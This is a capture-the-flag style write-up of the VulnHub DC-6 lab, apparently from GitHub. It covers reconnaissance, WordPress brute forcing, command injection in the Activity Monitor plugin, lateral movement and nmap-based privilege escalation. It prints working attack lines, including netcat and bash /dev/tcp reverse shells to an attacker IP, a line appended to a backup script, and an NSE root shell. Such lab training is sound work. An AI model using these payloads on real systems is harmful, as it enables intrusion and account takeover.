# VulnHub DC-6 — Penetration Testing Write-Up

**Author:** Saurabh Tiwari

---

## 1. Reconnaissance

### Host Discovery (Netdiscover)

To identify live hosts on the network:

```bash
sudo netdiscover -r 192.168.182.0/24
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/4f9c669b-f0f9-4d91-8a4c-4ff518c10fa1" />


**Result:**
Target machine identified at **192.168.182.135**

---

### Nmap Scan

```bash
nmap -sV -sC 192.168.182.135
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/d356ee4a-f008-4433-a7da-a60b6850cb15" />


**Findings:**

* Port 22: SSH
* Port 80: HTTP (WordPress)

---

## 2. Environment Setup

WPScan failed due to hostname redirection:

http://wordy/

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/49e5ba61-84dd-4089-9cb5-03484c35aff5" />


### Fix

```bash
echo "192.168.182.135 wordy" >> /etc/hosts
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/f9c4ada9-54de-4365-9847-135b6622d337" />


---

## 3. Web Enumeration

### Nikto Scan

```bash
sudo nikto -h http://wordy/
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/1efc6be5-bbfe-45a4-b98b-1f02a3ecbd16" />



**Key Findings:**

* Outdated Apache version
* Missing security headers
* WordPress detected
* Directory indexing enabled
* Login page exposed

---

## 4. WordPress Enumeration

### User Enumeration

```bash
wpscan --url http://wordy/ -e u
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/ee8d2759-7d03-4b12-8531-bb984c8e83a9" />


**Users:**
admin, graham, mark, sarah, jens

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/131b4043-e360-4b87-9a01-034ce044fb48" />

---

### Password List Generation

The DC-6 creator provided a hint:

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > /tmp/dc6pass.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/02ff06c7-69f9-426c-9dbf-6ff80813f6f7" />


---

### Brute Force Attack

```bash
wpscan --url http://wordy/ -U users.txt -P /tmp/dc6pass.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/113d9fdc-dc48-436e-84af-5024bffd54ac" />


**Result:**
Credentials found for user **mark**

---

## 5. Exploitation — Remote Code Execution

Login:

http://wordy/wp-admin

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/cd50316d-879c-4f4a-9bcc-511931f79f1f" />


The **Activity Monitor plugin** was vulnerable to command injection.

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/92bc445d-e07e-4a6e-a489-195089e59a81" />


### Exploit

```bash
127.0.0.1 | nc -e /bin/bash 192.168.182.129 4444
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/53c10782-7e8a-42d1-ae9e-a02fdf56d48f" />


### Result

Reverse shell obtained as **www-data**

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/ea2f47d1-7a90-4210-a782-03ea4c481443" />


---

## 6. Post Exploitation

Basic enumeration revealed user directories:

```bash
cd /home
ls
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/4a993773-c7cd-4862-a7dd-7298e77b5854" />


Check backup script:

```bash
cat /home/jens/backups.sh
```

*(Insert Image: backups.sh)*

---

## 7. Lateral Movement (www-data → graham)

```bash
cat /home/mark/stuff/things-to-do.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/99619b3f-5266-4436-b2f3-bf744e869e43" />


**Result:**
Plaintext password for graham found

---

### SSH Login

```bash
ssh graham@192.168.182.135
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/24ddede3-c639-4abb-84c8-b4bace0a06b3" />


---

## 8. Lateral Movement (graham → jens)

Check sudo permissions:

```bash
sudo -l
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/0469352c-b27b-49ae-b10f-af7a0bb3ce5d" />


**Finding:**
graham can execute backups.sh as jens

---

### Exploit

```bash
echo "bash -i >& /dev/tcp/192.168.182.129/5555 0>&1" >> /home/jens/backups.sh
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/281fa1d1-7f91-48af-b43a-faca77435246" />


```bash
sudo -u jens /home/jens/backups.sh
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/dc42915d-a7d7-4994-90df-b67e5524c741" />


---

## 9. Privilege Escalation (jens → root)

```bash
sudo -l
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/f9376bab-5f6a-4ce4-8d78-57ec40a97c5c" />


**Finding:**
jens can run nmap as root

---

### Exploit using NSE

```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
```

```bash
sudo nmap --script=/tmp/shell.nse 127.0.0.1
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/9a5fdbcd-8725-4b90-b431-c296607aeda7" />


**Result:**
Root shell obtained

---

## 10. Flag

```bash
cat /root/theflag.txt
```

<img width="800" height="500" alt="image" src="https://github.com/user-attachments/assets/38a04c07-ae9c-45bf-bb4e-8e986d860781" />


---

## 🔥 Attack Chain Summary

Netdiscover → Nmap → Hosts Fix → Nikto → WPScan → Brute Force → RCE → Lateral Movement → Privilege Escalation → Root

---

## 🔥 Attack Chain Summary

Reconnaissance (Netdiscover + Nmap)
→ Web Enumeration (Nikto)
→ WordPress Enumeration (WPScan)
→ Password Brute Force (custom filtered wordlist)
→ Remote Code Execution via Activity Monitor plugin
→ Lateral Movement (www-data → graham → jens)
→ Privilege Escalation using Nmap NSE
→ Root Access

---

## ✅ Key Takeaways

* Performing **host discovery first** ensures accurate target identification
* Web enumeration tools like Nikto help identify **misconfigurations and exposed attack surfaces**
* Weak or predictable passwords remain a major security risk
* Misconfigured **sudo permissions** can lead to full system compromise
* Proper enumeration at every stage is critical for successful exploitation
* Chaining multiple small vulnerabilities can result in **complete system takeover**

---

## 🧠 Conclusion

This lab highlights how weak credentials, vulnerable plugins, and misconfigured privileges can lead to full system compromise. It reinforces the importance of thorough enumeration and careful analysis at every stage of a penetration test.
